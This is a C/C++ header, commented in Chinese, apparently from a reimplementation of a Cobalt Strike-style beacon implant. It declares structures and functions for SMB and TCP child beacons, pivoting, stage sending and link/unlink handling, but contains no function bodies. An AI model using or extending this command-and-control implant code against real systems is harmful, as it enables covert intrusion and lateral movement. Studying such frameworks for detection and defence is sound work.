#pragma once
#include "comm.h"
#include "common.h"
/////////////////////////////////////




/// <summary>
/// tcp和smb子beacon的结构体
/// </summary>
struct ChildBeacon
{
	HANDLE smb;			/*smb beacon连接句柄*/
	SOCKET tcp;			/*tcp beacon连接句柄*/
	int(*recvChildBeacon)(ChildBeacon*, char*, int);/*读取beacon输出*/
	int(*sendChildBeacon)(ChildBeacon*, char*, int); /*向beacon发送数据*/
	int(*closeChildBeacon)(ChildBeacon*); /*关闭beacon连接*/
	BOOL(*FlushFileBuffers)(ChildBeacon*);/*smb beacon函数*/
	int(*checkChildBeacon)(ChildBeacon*, int);/*检查beacon连接*/
	void* null2; /*空函数*/
};
typedef int (__cdecl* recvChildBeacon_ptr)(ChildBeacon*, char*, int);
typedef int(__cdecl* sendChildBeacon_ptr)(ChildBeacon*, char*, int); /*向beacon发送数据*/
typedef int(__cdecl* closeChildBeacon_ptr)(ChildBeacon*); /*关闭beacon连接*/
typedef BOOL(__cdecl* FlushFileBuffers_ptr)(ChildBeacon*);/*smb beacon函数*/
typedef int(__cdecl* checkChildBeacon_ptr)(ChildBeacon*, int);/*检查beacon连接*/

struct ChildBeaconInfo
{
	int ChildBeaconId; /*子beacon id*/
	ChildBeacon ChildBeaconConfig; /*子beacon信息*/
	int state; /*子beacon状态*/
	char* ChildBeaconData; /*数据*/
	int ChildBeaconDataSize;
	int time;
};

extern ChildBeaconInfo gChildBeaconInfo[40];
extern int gChildBeaconInfoSize;

void BeaconRequestChildBeacon(char* Taskdata, int Task_size);


void BeaconUnlink(u_long ChildBeaconId);

int SendStageTCP(char* Taskdata, int Task_size);

void link_Smb_Beacon(char* Taskdata);

void BeaconTcpPivot(char* Taskdata, int TaskdataSize);

void connect_tcp_child_Beacon(char* Taskdata, int Task_size);

ChildBeacon* InitTcpChildBeacon(SOCKET conn, ChildBeacon* pTcpBeacon);

int __cdecl AddChildBeacon(u_long port,ChildBeacon* smb,ChildBeacon* tcp, recvChildBeacon_ptr recvChildBeacon, sendChildBeacon_ptr sendChildBeacon, closeChildBeacon_ptr closeChildBeacon,void* BeaconNULL, checkChildBeacon_ptr checkChildBeacon);

void CheckChildBeacon();

int RecvSmbData(HANDLE hFile, char* buffer, int size);